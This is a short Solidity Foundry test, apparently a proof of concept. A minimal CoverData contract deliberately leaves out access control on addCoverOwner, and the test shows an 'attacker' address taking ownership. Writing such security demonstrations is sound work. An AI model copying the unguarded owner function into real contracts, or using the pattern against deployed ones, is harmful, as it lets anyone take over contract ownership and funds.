```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.6;

import "forge-std/Test.sol";

// Minimal CoverData contract exhibiting the missing permission check vulnerability
contract CoverData {
    address public owner;

    // No access control – anyone can call addCoverOwner
    function addCoverOwner(address newOwner) external {
        owner = newOwner;
    }

    // Other functions could exist, but not needed for the PoC
}

contract ExploitTest is Test {
    CoverData cover;
    address attacker = address(0x1337);

    function setUp() public {
        cover = new CoverData();
        vm.label(address(cover), "CoverData");
        vm.label(attacker, "Attacker");
    }

    function testMissingPermissionCheck() public {
        // Initially, owner is zero (no one)
        assertEq(cover.owner(), address(0));

        // Attacker (unauthorized) calls addCoverOwner
        vm.prank(attacker);
        cover.addCoverOwner(attacker);

        // Now attacker is the owner – demonstrated the missing permission check
        assertEq(cover.owner(), attacker);
    }
}
```
